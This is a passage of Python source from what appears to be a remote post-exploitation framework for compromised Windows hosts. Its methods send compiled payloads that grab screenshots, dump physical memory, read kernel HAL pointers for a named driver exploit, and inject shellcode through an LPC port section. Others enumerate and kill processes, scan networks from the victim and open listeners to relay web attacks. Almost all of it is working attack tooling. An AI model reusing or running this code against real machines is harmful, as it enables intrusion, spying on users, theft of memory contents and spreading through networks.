          //EmptyClipboard();
          //SetClipboardData(CF_BITMAP,hbitmap);
          //CloseClipboard();

          size=3*hor*vert; //here's to hopin' :>

          pbih=&bi.bmiHeader;
          pbih->biSize=44; //sizeof(bi.bmiHeader)
          pbih->biHeight=vert;
          pbih->biWidth=hor;
          pbih->biPlanes=1;
          pbih->biBitCount=24;
          pbih->biCompression=BI_RGB;
          pbih->biSizeImage=size;


          hBmpFileDC=CreateCompatibleDC(newdc);
          hfilebitmap=CreateDIBSection(hBmpFileDC,&bi,DIB_RGB_COLORS,&pBits,0,0);
          SelectObject(hBmpFileDC,hfilebitmap);
          BitBlt(hBmpFileDC,0,0,hor,vert,newdc,0,0,SRCCOPY);


          sendint(hor);
          sendint(vert);
          senddata2self(pBits,size);

          //cleanup
          DeleteObject(hfilebitmap);
          DeleteObject(hbitmap);
          DeleteDC(hBmpFileDC);
          DeleteDC(dc);
          DeleteDC(newdc);
          SetThreadDesktop(olddesktop);
          CloseDesktop(topdesk);
          SetProcessWindowStation(oldwinsta);
          CloseWindowStation(newwinsta);

          //need to add closeobject here and deletedc, etc

        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        #print "Grabbing screenshot in 1 second!"
        #time.sleep(1)
        if progr:
            progr("Sending screengrab shellcode", 30.0)
        self.sendrequest(request)
        hor=self.readint()
        vert=self.readint()
        if progr:
            progr("Reading coordinates of screen", 40.0)

        devlog("win32mosdef", "Hor=%d vert=%d"%(hor,vert))
        data=""
        if progr:
            progr("Retrieving data", 60.0)

        if not fileobj:
            #just read the data into the file
            data=self.readblock()
        else:
            data=self.readblock(fileobj=fileobj)

        if progr:
            progr("Closing link with end", 90.0)

        #print "BGR (RGB backwards) Data=%s"%hexprint(data[:100])
        self.leave()
        if progr:
            progr("Completed receiving screenshot", 100.0)

        return hor,vert,data

    def MemdumpIoctl( self, fd, ionum, ram_size, log):
        """
        Specific handler for talking to our RAM dumper.
        """
        """
        If successful return value is non-zero,data
        """
        vars={}
        vars["fHandle"]  = fd
        vars["ionum"]    = ionum
        #vars["offset"]   = str(offset)
        vars["ram_size"] = ram_size

        code="""
        #import "remote", "kernel32.dll|DeviceIoControl" as "DeviceIoControl"
        #import "remote", "msvcrt.dll|_itoa" as "itoa"

        #import "local","sendint" as "sendint"
        #import "local","senddata2self" as "senddata2self"

        #import "int", "fHandle" as "fHandle"
        #import "int", "ionum" as "ionum"
        #import "int", "ram_size" as "ram_size"

        void main() {
          int ret;
          int cb;
          int bytecounter;
          char *offset;
          char empty[4096];
          bytecounter = 0;
          //ram_size=ram_size+4096;

          while(bytecounter<ram_size)
          {
            itoa(bytecounter,offset,10);
            ret=DeviceIoControl(fHandle,ionum,offset,4096,&empty,4096,&cb,0);
            sendint(ret);
            senddata2self(empty, cb);
            bytecounter=bytecounter+cb;

          }
          sendint(-1);

        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)

        ret = 1
        while ret != -1:
            ret  = sint32(self.readint())
            if ret != -1:
                #log.writestr("dump",self.readblock())
                #log.write(compressor.compress(self.readblock()))
                #buff+=compressor.compress(self.readblock())
                log.write(self.readblock())

        #log.write(compressor.flush())
        #buff+=compressor.flush()
        #log.write(buff)
        self.leave()
        return

    def DeviceIoControl(self, fd, ionum):
        """
        If successful return value is non-zero,data
        """
        vars={}
        vars["fHandle"]=fd
        vars["ionum"]=ionum

        code="""
        #import "remote", "kernel32.dll|DeviceIoControl" as "DeviceIoControl"
        #import "local","sendint" as "sendint"
        #import "local","senddata2self" as "senddata2self"

        #import "int", "fHandle" as "fHandle"
        #import "int", "ionum" as "ionum"

        void main() {
          int ret;
          int cb;
          char empty[4096];
          ret=DeviceIoControl(fHandle,ionum,0,0,&empty,4096,&cb,0);
          sendint(ret);
          senddata2self(empty, cb);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        data=self.readblock()
        self.leave()
        return ret, data

    def DeviceIoControlAddress(self, hDevice, IoControlCode, InBuffer="", OutBufferSize=0):
        vars={}
        vars['hDevice']       = hDevice
        vars['IoControlCode'] = IoControlCode
        vars['InBufferSize']  = len(InBuffer)
        vars['OutBufferSize'] = OutBufferSize

        code="""

        #import "remote", "kernel32.dll|DeviceIoControl" as "DeviceIoControl"
        #import "remote", "kernel32.dll|LocalAlloc" as "LocalAlloc"
        #import "remote", "kernel32.dll|LocalFree" as "LocalFree"

        #import "local", "readdatafromself" as "readdatafromself"
        #import "local",  "sendint" as "sendint"

        #import "int",    "hDevice" as "hDevice"
        #import "int",    "IoControlCode" as "IoControlCode"
        #import "int",    "InBufferSize" as "InBufferSize"
        #import "int",    "OutBufferSize" as "OutBufferSize"

        #define LPTR 0x0040 // LMEM_FIXED|LMEM_ZEROINIT

        void main() {
          int ret;
          int cb;

          void *in_buffer;
          void *out_buffer;

          in_buffer = 0;
          out_buffer = 0;

          // First allocate memory for input buffer, when needed
          if (InBufferSize > 0) {
              in_buffer = LocalAlloc(LPTR, InBufferSize);
              sendint(in_buffer);

              if (in_buffer == 0) {
                  return;
              }
          }

          // Next, allocate memory for output buffer, when needed
          if (OutBufferSize > 0) {
              out_buffer = LocalAlloc(LPTR, OutBufferSize);
              sendint(out_buffer);

              if (out_buffer == 0) {

                  if (InBufferSize > 0) {
                      LocalFree(in_buffer);
                  }

                  return;
              }
          }

          // Receive input buffer, when needed
          if (InBufferSize > 0) {
              readdatafromself(in_buffer, InBufferSize);
          }

          // Now, we do the call
          ret = DeviceIoControl(hDevice, IoControlCode, in_buffer, InBufferSize, out_buffer, OutBufferSize, &cb, 0);

          // Free buffers
          if (OutBufferSize > 0) {
              LocalFree(out_buffer);
          }

          if (InBufferSize > 0) {
              LocalFree(in_buffer);
          }

          sendint(ret);
        }
        """

        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)

        if len(InBuffer) > 0:
            alloc_inp = self.readint()

            if alloc_inp == 0:
                self.log('DeviceIoControlAddress/LocalAlloc(InBufferSize: %d) failed, aborting' % len(InBuffer))
                self.leave()
                return -1

            self.log('Allocated %d bytes at 0x%x' % (len(InBuffer), alloc_inp))

        if OutBufferSize > 0:
            alloc_out = self.readint()

            if alloc_out == 0:
                self.log('DeviceIoControlAddress/LocalAlloc(OutBufferSize: %d) failed, aborting' % OutBufferSize)
                self.leave()
                return -1

            self.log('Allocated %d bytes at 0x%x' % (OutBufferSize, alloc_out))

        if len(InBuffer) > 0:
            self.log('Sending %d bytes (InBuffer)..' % len(InBuffer))
            self.writebuf(InBuffer)

        ret = self.readint()
        self.leave()
        return ret

    def NtQueryIntervalProfile_getrequest(self,ProfileSource):
        vars={}
        vars['ProfileSource']=ProfileSource
        code="""
        #import "remote","ntdll.dll|NtQueryIntervalProfile" as "NtQueryIntervalProfile"
        #import "local","sendint" as "sendint"
        #import "int","ProfileSource" as "ProfileSource"

        void main()
        {
        int ret;
        int cb;
        ret=NtQueryIntervalProfile(ProfileSource,&cb);
        sendint(ret);
        }
        """
        self.clearfunctioncache() #acquires self.compilelock.
        request=self.compile(code,vars) #should self.compilelock.release()
        return request

    def NtQueryIntervalProfile(self, ProfileSource):
        """
        Calls NtQueryIntervalProfile and returns the result
        """
        request=self.NtQueryIntervalProfile_getrequest(ProfileSource)
        self.sendrequest(request) #acquires node lock
        ret=self.readint()
        self.leave() #removes node lock
        return ret

    def NtQueryIntervalProfile_threaded(self, ProfileSource):
        """
        Calls NtQueryIntervalProfile in a new thread - returns the mallocspace we used to do this and the threadid we spawned
        """
        message=self.NtQueryIntervalProfile_getrequest(ProfileSource)
        mallocspace,threadid=self.sendrequest_newthread(message)
        return mallocspace, threadid

    def EnumDeviceDrivers(self):
        """returns a list of imagebase addresses of loaded device drivers"""
        vars={}
        code="""
        #import "remote","psapi.dll|EnumDeviceDrivers" as "EnumDeviceDrivers"
        #import "local","malloc" as "malloc"
        #import "local","free" as "free"
        #import "local","sendint" as "sendint"
        #import "local","senddata2self" as "senddata2self"

        void main()
        {
        int ret;
        int cb;
        char *p;
        ret=EnumDeviceDrivers(NULL,0,&cb);
        p=malloc(cb);
        ret=EnumDeviceDrivers(p,cb,&cb);
        sendint(ret);
        if (ret==1) {
            senddata2self(p,cb);
        }
        free(p);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        addresses=[]
        if ret==1:
            data=self.readblock()
            for i in range(0,len(data),4):
                addresses.append(struct.unpack('<L',data[i:i+4])[0])
        self.leave()
        return ret,addresses

    def GetDeviceDriverBaseName(self,imagebase):
        """returns the basename of a device driver based on its imagebase address"""
        vars={}
        vars['ib']=imagebase
        code="""
        #import "remote","psapi.dll|GetDeviceDriverBaseNameW" as "GetDeviceDriverBaseNameW"
        #import "local","sendint" as "sendint"
        #import "local","sendunistring2self" as "sendunistring2self"
        #import "int","ib" as "ib"

        void main()
        {
        int ret;
        short s[260];
        ret=GetDeviceDriverBaseNameW(ib,s,260);
        sendint(ret);
        if (ret!=0) {
            sendunistring2self(s);
        }
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        data=''
        if ret!=0:
            data=self.readblock() #because readunistring() removes '\0's
        self.leave()
        return ret,data

    def SecDrvGetHalPointers(self,haldispatchtable):
        """returns the 3 Hal pointers needed for the secdrv exploit"""
        vars={}
        vars['haldispatchtable']=haldispatchtable
        code="""
        #import "local","sendint" as "sendint"
        #import "int","haldispatchtable" as "haldispatchtable"

        void main()
        {
        int haloffset;
        int *p;
        p=haldispatchtable-4;
        haloffset=*p;
        sendint(haloffset);
        p=haldispatchtable+8;
        haloffset=*p;
        sendint(haloffset);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        haloffset1=uint32(self.readint())
        haloffset2=uint32(self.readint())
        self.leave()
        return haloffset1,haloffset2

    def drinkcoaster(self,drive):
        """
        ejects the cdrom
        """

        vars={}
        vars["file"]="\\\\.\\\\"+drive
        vars["GENERIC_READ"]=GENERIC_READ
        vars["FILE_SHARE_READ"]=FILE_SHARE_READ
        vars["OPEN_EXISTING"]=OPEN_EXISTING
        code="""
        #import "remote", "kernel32.dll|CreateFileA" as "CreateFileA"
        #import "remote", "kernel32.dll|DeviceIoControl" as "DeviceIoControl"
        #import "remote", "kernel32.dll|CloseHandle" as "CloseHandle"
        #import "local","sendint" as "sendint"
        #import "local","debug" as "debug"
        #import "string","file" as "file"
        #import "int","GENERIC_READ" as "GENERIC_READ"
        #import "int","FILE_SHARE_READ" as "FILE_SHARE_READ"
        #import "int","OPEN_EXISTING" as "OPEN_EXISTING"


        void main() {
          int ret;
          int h;
          char empty[1];

          empty[0]=0;
          //debug();
          h=CreateFileA(file,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
          ret=0;
          DeviceIoControl(h,0x002d4808,empty,0,empty,0,&ret,0);
          CloseHandle(h);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        self.leave()
        return

    def WLSIgetShellcode(self, lpcname, shellcode):

        vars = {}
        vars["buffer"]=buffer
        code = """
        #import "remote","ntdll.dll|NtCreateSection" as "NtCreateSection"
        #import "remote","ntdll.dll|NtConnectPort" as "NtConnectPort"
        #import "local","sendint" as "sendint"
        #import "string","buffer" as "buffer"
        #import "int", "length" as "length"
        #import "local", "memset" as "memset"
        #import "local","readdatafromself" as "readdatafromself"
        #import "local","readintfromself" as "readintfromself"

        struct LARGE_INTEGER {
               unsigned long LowPart;
               unsigned long HighPart;
        };
        struct LpcSectionInfo {
        unsigned long Length;
        unsigned long SectionHandle;
        unsigned long Param1;
        unsigned long SectionSize;
        unsigned long ClientBaseAddress;
        unsigned long ServerBaseAddress;
        };
        struct LpcSectionMapInfo {
        unsigned long Length;
        unsigned long SectionSize;
        unsigned long ServerBaseAddress;
        };
        struct SECURITY_QUALITY_OF_SERVICE {
        unsigned long  Length;
        unsigned long ImpersonationLevel;
        unsigned long ContextTrackingMode;
        unsigned long  EffectiveOnly;
        };
        struct LSA_UNICODE_STRING {
           unsigned short Length; //length in bytes
           unsigned short MaximumLength; //max length in bytes
           char * Buffer; //wstring printer
        };


        void main() {
         unsigned long hSection;
         unsigned long hPort;
         int SECTION_ALL_ACCESS;
         struct LARGE_INTEGER MaximumSize;
         struct LpcSectionMapInfo mapInfo;
         int i;
         struct LSA_UNICODE_STRING uStr;
         struct SECURITY_QUALITY_OF_SERVICE qos;
         struct LpcSectionInfo sectionInfo;
         unsigned char ConnectionBuffer[100];
         unsigned long maxSize;
         unsigned long Size;
         unsigned long qosSize;
         unsigned char *buf;
         unsigned int size;

         Size = 256;
         hPort = 0;

         MaximumSize.LowPart  = 0x10000;
         MaximumSize.HighPart = 0x0;
         SECTION_ALL_ACCESS= 0xf001f;

         for(i=0; i<100; i = i+1 ) {
              ConnectionBuffer[i] = 0x0;
         }

         hSection = 0;
         i = NtCreateSection(&hSection, SECTION_ALL_ACCESS, 0x0,  &MaximumSize, 0x4, 0x8000000, 0x0);

         sendint(i);

         if(i != 0 ) {
               return 0;
         }

         memset(&sectionInfo,0,16);
         sectionInfo.Length = 0x18;
         sectionInfo.SectionHandle = hSection;
         sectionInfo.SectionSize = 0x1000;
         mapInfo.Length = 0xc;

         uStr.Length = length;
         //uStr.MaximumLength = length + 2;
         uStr.MaximumLength = length ;
         uStr.Buffer = buffer;

         qos.Length=16;
         qos.ImpersonationLevel  = 0x2;
         qos.ContextTrackingMode = 0x01000101;
         qos.EffectiveOnly = 0x10000;
         maxSize = 0;

          i=NtConnectPort(&hPort, &uStr, &qos, &sectionInfo, &mapInfo, &maxSize, &ConnectionBuffer, &Size);
          //i=NtConnectPort(&hPort, &uStr, &qos, 0, &mapInfo, &maxSize, &ConnectionBuffer, &Size);
         //i=NtConnectPort(&hPort, &uStr, &qos, 0, 0, 0, 0, 0);

         sendint(i);

         if(i != 0) {
               return 0;
         }

         buf = sectionInfo.ClientBaseAddress;
         sendint(sectionInfo.ServerBaseAddress);

         size = readintfromself();

         readdatafromself(buf,size);


         }
        """
        #NT_STATUS_OBJECT_NAME_NOT_FOUND. 0xc0000033
        #NT_STATUS_INVALID_VIEW_SIZE 0xc000001f
        #lpcname="\\RPC Control\\LRPC0000044c.00000001"
        self.log("Using lpcname: %s"%lpcname)
        ulpcname = msunistring(lpcname)+"\x00\x00\x00\x00"

        vars['buffer'] = ulpcname
        vars['length'] = len(lpcname)*2
        #node = self.argsDict["passednodes"][0]

        self.clearfunctioncache()
        request= self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint()
        #self.shellcode = "\xcc" * 0x300
        if ret != 0:
            self.log("Remote NtCreateSection failed")
            return 0
        ret = self.readint() #lsaHandle on success
        if ret != 0:
            self.log("Remote NtConnectPort failed")
            return 0
        serverbaseaddr = self.readint() #lsaHandle on success

        self.log("SeverBaseAddress: 0x%08x" % serverbaseaddr)

        self.sendblock( shellcode )

        self.leave()
        return serverbaseaddr


    def get_owner_of_process(self, pid):
        """
        For a specified pid get its owner
        http://nibuthomas.wordpress.com/2008/01/08/how-to-get-name-of-owner-of-a-process/

        http://xcybercloud.blogspot.com/2009/02/get-process-owner.html
        """
        vars={}
        vars["accessrights"]=TOKEN_QUERY
        #vars["accessrights"]=TOKEN_DUPLICATE
        #vars["pid"]=self.GetCurrentProcess()

        vars["pToken"]=self.openprocess(pid)
        logging.debug("Getting token for %s - %s" % (pid, vars["pToken"]))

        code="""
        #import "remote", "kernel32.dll|CloseHandle" as "CloseHandle"
        #import "remote", "advapi32.dll|GetTokenInformation" as "GetTokenInformation"
        #import "remote", "advapi32.dll|OpenProcessToken" as "openprocesstoken"
        #import "remote", "advapi32.dll|LookupAccountSidA" as "LookupAccountSidA"

        #import "int", "accessrights" as "accessrights"
        #import "int", "pToken" as "pToken"

        #import "local","sendint" as "sendint"
        #import "local","sendstring" as "sendstring"

        struct SID_AND_ATTRIBUTES {
        char *Sid;
        int Attributes;
        };

        struct TOKEN_USER {
        struct SID_AND_ATTRIBUTES User;
        };

        // is actually an enum .. but whatever
        struct SID_NAME_USE_fakenum {
            int SidTypeUser;
            int SidTypeGroup;
            int SidTypeDomain;
            int SidTypeAlias;
            int SidTypeWellKnownGroup;
            int SidTypeDeletedAccount;
            int SidTypeInvalid;
            int SidTypeUnknown;
            int SidTypeComputer;
            int SidTypeLabel;
        };


        void main() {
        //Get the name of the owner of the process
        int ret;
        int hToken;
        struct TOKEN_USER* userToken;
        struct SID_AND_ATTRIBUTES* pUser;
        struct SID_NAME_USE_fakenum nu;
        char name[512];
        char domain[512];
        int nameSize;
        int dwRequireSize;
        int TokenUser;
        char userInfo[128];
        int domainSize;

        hToken = 0;
        ret=openprocesstoken(pToken, accessrights, &hToken);
        if (ret==0) {
          sendint(-1);
          return;
        }


        // retrieve user security info(SID) about this access token
        dwRequireSize = 0;

        TokenUser = 1 ;

        //XXX: Don't believe sizeof() works. Replace with an integer constant.
        //GetTokenInformation(hToken,TokenUser,&userInfo,sizeof(userInfo),&dwRequireSize);
        GetTokenInformation(hToken,TokenUser,&userInfo,128,&dwRequireSize);


         userToken = userInfo;
         nameSize = 512;
         domainSize = 512;
         pUser=userToken->User;


         if (LookupAccountSidA(0,pUser->Sid,name,&nameSize,domain,&domainSize,&nu))
          {
             sendint(1);
             sendstring(name);
          }
          else
          {
            sendint(-3);
          }
         }
        """
        ret=[]
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        success=sint32(self.readint())
        #print "===%s"%(success)
        if success == 1:
            ret=self.readstring()
            #print "====%s"%(ret)
        self.leave()
        return ret

    def processlist(self):
        """
        Returns a list of dictionaries of the processes
        """
        ret=[]

        vars={}
        code="""
        #import "remote", "kernel32.dll|CreateToolhelp32Snapshot" as "CreateToolhelp32Snapshot"
        #import "remote", "kernel32.dll|Process32First" as "Process32First"
        #import "remote", "kernel32.dll|Process32Next" as "Process32Next"
        #import "remote", "kernel32.dll|CloseHandle" as "CloseHandle"

        #import "local","sendint" as "sendint"
        #import "local","sendstring" as "sendstring"

        //#import "local","debug" as "debug"
        //http://www.cs.colorado.edu/~main/cs1300/include/tlhelp32.h for #defines?

        struct PROCESSENTRY32 {
          int dwSize;
          int cntUsage;
          int th32ProcessID;
          int * th32DefaultHeapID;
          int th32ModuleID;
          int cntThreads;
          int th32ParentProcessID;
          int pcPriClassBase;
          int dwFlags;
          char szExeFile[1024];
          };

        void main() {
          int ret;
          int hProcessSnap;
          struct PROCESSENTRY32 pe32;

          // Take a snapshot of all processes in the system.
          hProcessSnap = CreateToolhelp32Snapshot( 2, 0 ); //TH32CS_SNAPPROCESS (2) on all processes (0)
          if( hProcessSnap == -1 )
          {
            sendint(-1);
          }
          // Set the size of the structure before using it.
          pe32.dwSize = 1060; //sizeof( PROCESSENTRY32 ); // (sizeof is hard, sorry)
          ret=Process32First( hProcessSnap, &pe32 );
          if (ret==0) {
             sendint(-1);
             return;
          }
          //send first process
          sendint(1);
          sendstring(pe32.szExeFile);
          sendint(pe32.th32ProcessID );
          sendint(pe32.cntThreads );
          sendint(pe32.th32ParentProcessID );

          //send all remaining processes
          while( Process32Next( hProcessSnap, &pe32 ) )
          {
             sendint(1);
             sendstring(pe32.szExeFile);
             sendint(pe32.th32ProcessID );
             sendint(pe32.cntThreads );
             sendint(pe32.th32ParentProcessID );
          }
          //last process...
          sendint(-1);
          CloseHandle(hProcessSnap);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=[]
        success=1
        while success != -1:
            success=sint32(self.readint())
            if success == -1:
                break
            proc={}
            proc["exe"]=self.readstring()
            proc["pid"]=self.readint()
            proc["cntThreads"]=self.readint()
            proc["ppid"]=self.readint()
            ret.append(proc)
        self.leave()
        return ret

    def dokillprocess(self,pid):
        """
        Kills a process identified by pid.
        """
        vars={}
        vars["pid"]=int(pid)
        code="""
        #import "remote", "kernel32.dll|OpenProcess" as "OpenProcess"
        #import "remote", "kernel32.dll|TerminateProcess" as "TerminateProcess"
        #import "remote", "kernel32.dll|CloseHandle" as "CloseHandle"
        #import "local","sendint" as "sendint"
        #import "int","pid" as "pid"


        void main() {
          int ret;
          int h;
          char empty[1];

          empty[0]=0;
          //debug();
          h=OpenProcess(1,0,pid); //1 is process_terminate, 0 for inheritable, and pid for pid
          if (h==0) {
             sendint(-2); // -2 for failed to open
             return;
          }
          ret=TerminateProcess(h,0); //0 for exit code
          if (ret==0) {
             sendint(-1); // -1 for failed to terminate
             CloseHandle(h);
             return;
          }
          sendint(1);
          CloseHandle(h);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        return ret


    def tcpConnectScan(self,network,startport=1,endport=1024, timeout=15000):
        """
        Connectscan from the remote host!
        default timeout is 15 seconds per (host & port-range of 64)
        """

        if network.count("/"):
            network,netmask=network.split("/")
        else:
            netmask=32
        netmask=int(netmask)

        hostlong=socket.gethostbyname(network) #resolve from remotehost
        hostlong=str2bigendian(socket.inet_aton(hostlong))
        numberofips=2**(32-netmask) #how many ip's total
        startip=hostlong&(~(numberofips-1)) #need to mask it out so we don't do wacky things

        self.log("numberofips %d startport: %d  endport: %d timeout/64ports: %d ms" % (numberofips, startport, endport, timeout))

        vars={}
        vars["startip"]=startip
        vars["AF_INET"]=AF_INET
        vars["SOCK_STREAM"]=SOCK_STREAM
        vars["startport"]=startport
        vars["endport"]=endport
        vars["WSA_MAXIMUM_WAIT_EVENTS"]=64
        vars["FIONBIO"]=0x8004667eL
        vars["FD_CONNECT"]=0x10
        vars["numberofips"]=numberofips
        #timeout in miliseconds
        vars["timeout"]=timeout
        code="""
        #import "remote","ws2_32.dll|socket" as "socket"
        #import "remote","ws2_32.dll|ioctlsocket" as "ioctlsocket"
        #import "remote","ws2_32.dll|WSACreateEvent" as "WSACreateEvent"
        #import "remote","ws2_32.dll|WSAEventSelect" as "WSAEventSelect"
        #import "remote","ws2_32.dll|WSACreateEvent" as "WSACreateEvent"
        #import "remote","ws2_32.dll|connect" as "connect"
        #import "remote","ws2_32.dll|WSAWaitForMultipleEvents" as "WSAWaitForMultipleEvents"
        #import "remote","ws2_32.dll|WSAEnumNetworkEvents" as "WSAEnumNetworkEvents"
        #import "remote","ws2_32.dll|closesocket" as "closesocket"
        #import "remote","ws2_32.dll|WSACloseEvent" as "WSACloseEvent"
        #import "local", "sendint" as "sendint"
        #import "local", "htons" as "htons"
        #import "local", "htonl" as "htonl"
        #import "local", "debug" as "debug"
        #import "int", "startip" as "startip"
        #import "int", "startport" as "startport"
        #import "int", "endport" as "endport"
        #import "int", "numberofips" as "numberofips"
        #import "int", "AF_INET" as "AF_INET"
        #import "int", "SOCK_STREAM" as "SOCK_STREAM"
        #import "int", "WSA_MAXIMUM_WAIT_EVENTS" as "WSA_MAXIMUM_WAIT_EVENTS"
        #import "int", "FIONBIO" as "FIONBIO"
        #import "int", "FD_CONNECT" as "FD_CONNECT"
        #include "socket.h"
        #import "local", "memset" as "memset"

        struct WSANETWORKEVENTS {
            long lNetworkEvents;
            int iErrorCode[10];
        };

        void main()
        {
            unsigned int num_of_ports;
            int i;
            int ioMode;
            //WSAEVENT events
            unsigned int events[64];
            unsigned int sockets[64];
            struct sockaddr_in sin;
            unsigned int low;
            unsigned int high;
            unsigned int tmpport;
            unsigned int timeout;
            unsigned int currentip;
            struct WSANETWORKEVENTS out;
            int *tmp;
            int state;
            unsigned int l;
            unsigned int k;

            currentip = startip;
            l = numberofips;
            //iploop
            while(l > 0){

                low = startport;
                high = endport;

                // error and sanity checking
                if(low > high) {
                    while(l > 0) {
                        sendint(-1);
                        l = l - 1;
                    }
                    sendint(-1);
                    return;
                }
                if(high > 0xffff) {
                    high = 0xffff;
                }
                if(low > 0xffff) {
                    low = 0xffff;
                }
                num_of_ports = high - low;
                if(num_of_ports == 0) {
                    while(l > 0) {
                        sendint(-1);
                        l = l - 1;
                    }
                    sendint(-1);
                    return;
                }

                if(num_of_ports > WSA_MAXIMUM_WAIT_EVENTS) {
                    num_of_ports = WSA_MAXIMUM_WAIT_EVENTS;
                }

                sin.family=AF_INET;
                sin.addr = htonl(currentip);
                //non-blocking
                ioMode = 0;

                //recurse here!
                //oh well use while instead of recurse
                tmpport = low;
                //portloop
                while(low < high+1) {
                    i = 0;
                    while(i < num_of_ports) {
                        sockets[i] = socket(AF_INET, SOCK_STREAM, 0);
                        ioctlsocket(sockets[i], FIONBIO, &ioMode);
                        events[i] = WSACreateEvent();
                        WSAEventSelect(sockets[i], events[i], FD_CONNECT);
                        i=i+1;
                    }

                    i = 0;
                    while(i < num_of_ports) {
                        sin.port = htons(low);
                        connect(sockets[i], &sin, 16);
                        i=i+1;
                        low=low+1;
                    }

                    //WSA_INFINITE = -1
                    WSAWaitForMultipleEvents(num_of_ports, events, 1, timeout, 0);

                    low = tmpport;
                    i = 0;
                    while(i < num_of_ports) {
                        memset(&out,0xff,44);
                        WSAEnumNetworkEvents(sockets[i], events[i], &out);
                        //FD_CONNECT_BIT = 4
                        tmp = out.iErrorCode;
                        state = tmp[4];
                        if(state == 0){
                            sendint(low);
                        }
                        closesocket(sockets[i]);
                        WSACloseEvent(events[i]);
                        low=low+1;
                        i=i+1;
                    }
                    // if low == high+1 we're done, otherwise update num_ports
                    if (high+1 > low) {
                        num_of_ports = high+1 - low;
                        if (num_of_ports > WSA_MAXIMUM_WAIT_EVENTS) {
                            num_of_ports = WSA_MAXIMUM_WAIT_EVENTS;
                        }
                    }
                    // if we're not done, update tmpport
                    if (num_of_ports != 0) {
                        tmpport = low;
                    }

                }//portloop_end
                //done

                sendint(-1);
                currentip = currentip + 1;
                l = l - 1;

            }//iploop_end

            sendint(0);
            return;
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)

        iplist=[]
        l = numberofips
        cip = startip
        while l > 0:
            self.log(" ")
            host = socket.inet_ntoa(struct.pack(">L",cip))
            self.log("scanning %s:%d-%d" % (host, startport, endport))
            port=0
            openports=[]

            while port != -1:
                port=sint32(self.readint())
                if port != -1:
                    openports.append(port)
                    self.log("%d/tcp (open)" % port)

            iplist.append([host, openports])
            cip += 1
            l -= 1

        # 0 is scanned ok, -1 is error in sanity checks
        ret = sint32(self.readint())
        if ret == -1:
            logging.warning("[!] one of the arguments failed the sanity checks!")
        self.leave()
        return iplist

    def pingSweep(self,network):
        """
        pingsweep the target network
        """
    def bind(self, fd, (addr,port)):
        """
        Does a bind call on a socket. This is for setting up a remote web server
        to bounce web attacks.
        """
        vars = {}
        vars["fd"]      = fd
        vars["addr"]    = str2littleendian(socket.inet_aton(addr))
        vars["port"]    = port
        vars["AF_INET"] = 2

        code = """
        #import "remote","ws2_32.dll|socket" as "socket"
        #import "remote","ws2_32.dll|bind" as "bind"

        #import "local","sendint" as "sendint"
        #import "local", "htons" as "htons"
        #import "int", "AF_INET" as "AF_INET"

        #import "int","fd" as "fd"
        #import "int","addr" as "addr"
        #import "int","port" as "port"

        #include "socket.h"

        void main()
        {

          int i;
          struct sockaddr_in serv_addr;

          serv_addr.family=AF_INET; //af_inet
          serv_addr.port=htons(port);
          serv_addr.addr=addr;

          i=bind(fd,&serv_addr,16);

          if(i == 0)
          {
              sendint(i); // successful bind
          }else{
              sendint(i); // something bad happened
          }

        }

        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        result=sint32(self.readint())
        self.leave()
        return result

    def listen(self,sockfd,backlog):
        """
        Does a listen on a bound socket.
        """
        vars = {}
        vars["sockfd"]  = sockfd
        vars["backlog"] = backlog

        code = """
        #import "remote","ws2_32.dll|listen" as "listen"

        #import "int","sockfd" as "sockfd"
        #import "int","backlog" as "backlog"

        #import "local","sendint" as "sendint"

        void main()
        {
            int result;
            result = listen(sockfd,backlog);

            if(result == 0)
            {
                sendint(result);    // success!
            }else{
                sendint(result);    // failed!
            }
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        result = sint32(self.readint())
        self.leave()
        return result

    def getListenSock(self,addr,port):
        """
        Creates a tcp listener socket fd on a port
        """
        vars={}

        code="""
        #import "remote","ws2_32.dll|socket" as "socket"
        #import "remote","ws2_32.dll|bind" as "bind"
        #import "remote","ws2_32.dll|listen" as "listen"

        #import "local", "sendint" as "sendint"
        #import "local", "htons" as "htons"
        #import "local", "htonl" as "htonl"
        #import "int", "addr" as "addr"
        //#import "local", "debug" as "debug"
        #import "int", "port" as "port"
        #import "int", "AF_INET" as "AF_INET"
        #import "int", "SOCK_STREAM" as "SOCK_STREAM"
        #include "socket.h"

        void main()
        {
          int sockfd;
          int i;
          struct sockaddr_in serv_addr;

          serv_addr.family=AF_INET; //af_inet

          sockfd=socket(AF_INET,SOCK_STREAM,0);
          serv_addr.port=htons(port);
          serv_addr.addr=addr;
          i=bind(sockfd,&serv_addr,16);
          if (i!=-1) {
            i=listen(sockfd,16);
            if (i!=-1) {
               sendint(sockfd); //success
            }
          else {
            sendint(-2); //failed to listen
           }
          }
          else {
           sendint(-1); //failed to bind

          }

        }
        """
        vars["port"]=port
        vars["addr"]=str2littleendian(socket.inet_aton(addr))
        vars["AF_INET"]=2
        vars["SOCK_STREAM"]=1
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        fd=sint32(self.readint())
        self.leave()
        return fd



    def slowarpscan(self,network,netmask):
        hostlong=socket.gethostbyname(network) #resolve from remotehost
        hostlong=str2bigendian(socket.inet_aton(hostlong))
        numberofips=2**(32-netmask) #how many ip's total
        startip=hostlong&(~(numberofips-1)) #need to mask it out so we don't do wacky things
